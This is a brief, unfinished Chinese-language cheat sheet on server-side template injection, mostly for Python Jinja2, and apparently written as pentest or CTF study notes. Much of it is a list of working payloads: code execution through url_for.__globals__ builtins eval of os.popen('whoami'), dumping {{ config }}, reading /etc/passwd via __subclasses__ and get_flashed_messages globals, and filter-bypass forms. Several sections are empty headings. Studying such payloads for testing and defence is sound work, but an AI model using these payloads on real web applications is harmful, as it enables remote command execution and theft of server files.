# 服务端模板注入（SSTI，Server Side Template Injection）

模板？

## Python Jinja2

{{ }}
{% %}

__import__("os").popen("whoami").read()

[open](https://docs.python.org/zh-cn/3.10/library/functions.html#open) 为 Python 内置函数

open("/etc/passwd").read()

特殊方法

__subclasses__()

特殊属性

- `object.__class__`，返回该对象所属的类

```python
>>> ''.__class__
<class 'str'>
>>> [].__class__
<class 'list'>
```

- `function.__globals__`，返回存放该函数中 全局变量

- `class.__base__`，返回类的父类

```python
>>> ''.__class__.__base__
<class 'object'>
```

### 常用payload

{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}

{{ config }}

#### 读文件

```
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

{{get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read()}}
```

## 绕过过滤

```python
request.__class__
request["__class__"]
```

### `_`

### `[ ]`

### `|join`

## PHP SSTI
